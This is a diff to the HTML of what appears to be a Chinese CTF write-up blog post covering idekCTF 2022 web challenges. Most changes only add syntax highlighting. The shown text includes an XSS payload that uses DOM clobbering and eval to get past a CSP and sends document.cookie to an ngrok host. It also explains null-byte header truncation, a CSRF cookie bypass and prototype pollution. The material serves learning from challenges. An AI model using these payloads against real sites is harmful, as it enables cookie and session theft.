@@ -87,8 +87,8 @@
 <p>从<a href="https://www.zeyu2001.com/">@zeyu2001</a>师傅的<code>payload</code>学习赛中卡住的相关基础知识后自己尝试复现</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;x&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;/pre&gt;&lt;iframe name=&#39;fetch(&amp;quot;http://0.tcp.ngrok.io:15336?cookie=&amp;quot;+document.cookie)&#39; srcdoc=&#39;&lt;iframe name=config srcdoc=&amp;#039;&lt;head&gt;&lt;title id=debug&gt;test&lt;/title&gt;&lt;/head&gt;&lt;frameset id=opts cols=x:eval(/*, */name)//&gt;&lt;/frameset&gt;&amp;#039;&gt;&lt;/iframe&gt;&lt;div id=json-input&gt;{&amp;quot;x&amp;quot;:&amp;quot*/name)//&amp;quot}&lt;/div&gt;&lt;script src=static/js/main.js&gt;&lt;/script&gt;&#39;&gt;&lt;/iframe&gt;&#34;</span>}
 </span></span></code></pre></div><p>源码不多，简单看一下源码，一个<code>flask</code>应用为服务添加<code>CSP</code>：</p>
-<pre tabindex="0"><code>response.headers[&#39;Content-Security-Policy&#39;] = &#34;script-src &#39;unsafe-eval&#39; &#39;self&#39;; object-src &#39;none&#39;;&#34;
-</code></pre><p>这允许我们使用同源的<code>JS</code>文件和<code>eval</code>函数，然后有个<code>main.js</code>文件，关键代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">headers</span>[<span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;script-src &#39;unsafe-eval&#39; &#39;self&#39;; object-src &#39;none&#39;;&#34;</span>
+</span></span></code></pre></div><p>这允许我们使用同源的<code>JS</code>文件和<code>eval</code>函数，然后有个<code>main.js</code>文件，关键代码如下：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">userJson</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">inputBox</span>.<span style="color:#a6e22e">textContent</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cols</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">config</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">opts</span><span style="color:#f92672">?</span>.<span style="color:#a6e22e">cols</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">defaults</span>.<span style="color:#a6e22e">opts</span>.<span style="color:#a6e22e">cols</span>;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">output</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">userJson</span>, <span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">cols</span>);
@@ -148,8 +148,8 @@
 </span></span></code></pre></div><p>此时我们可控的<code>output</code>为</p>
 <p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301202023919.png" alt="image-20230120202348875"></p>
 <p>此时的cols可想到用<code>a:eval(xx)//</code>来执行命令，因为在js中，我们传入的<code>output</code>始终会用<code>{}</code>，所以执行赋值的时候需要配上键值对</p>
-<pre tabindex="0"><code>eval(`beautified = ${output}`);
-</code></pre><p>但是</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>eval(<span style="color:#e6db74">`beautified = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">output</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span></code></pre></div><p>但是</p>
 <p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301202027220.png" alt="image-20230120202700177"></p>
 <p>JSON.stringify()接收的第三个参数限制10个字母长，好在json字符串也是我们可控的，可以使用注释<code>/**/</code>来拼接，也就是</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
@@ -256,18 +256,18 @@
 <p>根据出题人<a href="https://github.com/nyxsorcerer/idekctf-2022-stargazer">@nyxmare</a>提供的payload进行学习，题目难，所以这题更多是去理解出题人的解法，没啥自己的想法</p>
 <p>下载附件，先看一手bot，发现<code>flag</code>在<code>cookie</code>中，且设置的域为<code>&quot;domain&quot;:&quot;.backend.magic.world&quot;</code>，所以目标是后端的<code>XSS</code>。查看附件中nginx的配置，发现题目分为前后端，前后端分离，再看一眼前端就一个<code>index.html</code>，读了下代码，发现虽然可以原型链污染<code>&lt;iframe&gt;</code>执行任意JS，但是因为<code>bot</code>的域的原因，这里无法直接使用，然后后端有使用简单的<code>template</code>渲染，看了下写法，发现没有什么可以利用的。</p>
 <p>根据<code>payload</code>发现<code>XSS</code>，在后端查看文件的路由中</p>
-<pre tabindex="0"><code>e.Any(&#34;/file/:uuid/:filename&#34;, viewFileHandler, isLoggedIn)
-</code></pre><p>这里接收两个参数，但是<code>viewFileHandler</code>只用到了<code>uuid</code>，所以<code>filename</code>可以随便设置，在<code>viewFileHandler</code>函数中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Any</span>(<span style="color:#e6db74">&#34;/file/:uuid/:filename&#34;</span>, <span style="color:#a6e22e">viewFileHandler</span>, <span style="color:#a6e22e">isLoggedIn</span>)
+</span></span></code></pre></div><p>这里接收两个参数，但是<code>viewFileHandler</code>只用到了<code>uuid</code>，所以<code>filename</code>可以随便设置，在<code>viewFileHandler</code>函数中</p>
 <p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301232040325.png" alt="image-20230123204023104"></p>
 <p>根据<code>UUID</code>在数据库中获得上传时传入的<code>FilesUpload</code>结构体数据</p>
-<pre tabindex="0"><code>type FilesUpload struct {
-	UUID        string
-	Title       string
-	ContentType string
-	Filename    string
-	Username    string
-}
-</code></pre><p>然后将其设置在响应头中。这里作者在注册时在<code>Username</code>中使用了空字节来截断响应头，达到XSS的目的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">FilesUpload</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">UUID</span>        <span style="color:#66d9ef">string</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Title</span>       <span style="color:#66d9ef">string</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ContentType</span> <span style="color:#66d9ef">string</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Filename</span>    <span style="color:#66d9ef">string</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">Username</span>    <span style="color:#66d9ef">string</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后将其设置在响应头中。这里作者在注册时在<code>Username</code>中使用了空字节来截断响应头，达到XSS的目的</p>
 <p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301232133026.png" alt="image-20230123213302840"></p>
 <p>既然XSS的点找到了，但是访问文件路由时需要<code>session</code>，也就需要我们先登录获取<code>set-cookie</code>到bot的环境下，但是访问<code>/login</code>接口需要<code>_csrf</code>令牌符合，根据配置</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">Use</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFWithConfig</span>(<span style="color:#a6e22e">middleware</span>.<span style="color:#a6e22e">CSRFConfig</span>{
@@ -320,8 +320,8 @@ $(&#34;iframe&#34;).attr({ src: BASE_URL + q,...})
 <p>完成污染后，会对<code>&lt;iframe&gt;</code>设置<code>srcdoc</code>属性，且优先级高于<code>src</code></p>
 <p><img src="https://raw.githubusercontent.com/an5er/cloudimg/main/blog/202301232245262.png" alt="image-20230123224540071"></p>
 <p>执行我们传入的js，为之前的登录请求添加<code>Cookie</code>属性绕过<code>_csrf</code>的限制</p>
-<pre tabindex="0"><code>document.cookie=&#39;_csrf=nyxmare; Path=/login; Domain=.magic.world&#39;
-</code></pre><p><code>bot</code>的<code>cookie</code>域只在后端域名，所以我们需要在后端中找到一个点，可以跳转到我们准备好的执行上面一系列的html中。在<code>index.js</code>中</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;_csrf=nyxmare; Path=/login; Domain=.magic.world&#39;</span>
+</span></span></code></pre></div><p><code>bot</code>的<code>cookie</code>域只在后端域名，所以我们需要在后端中找到一个点，可以跳转到我们准备好的执行上面一系列的html中。在<code>index.js</code>中</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">q</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseParams</span>(<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">q</span>.<span style="color:#a6e22e">message</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">welcome</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> (<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;/isLoggedIn&#34;</span>, { <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;include&#34;</span> })).<span style="color:#a6e22e">json</span>();
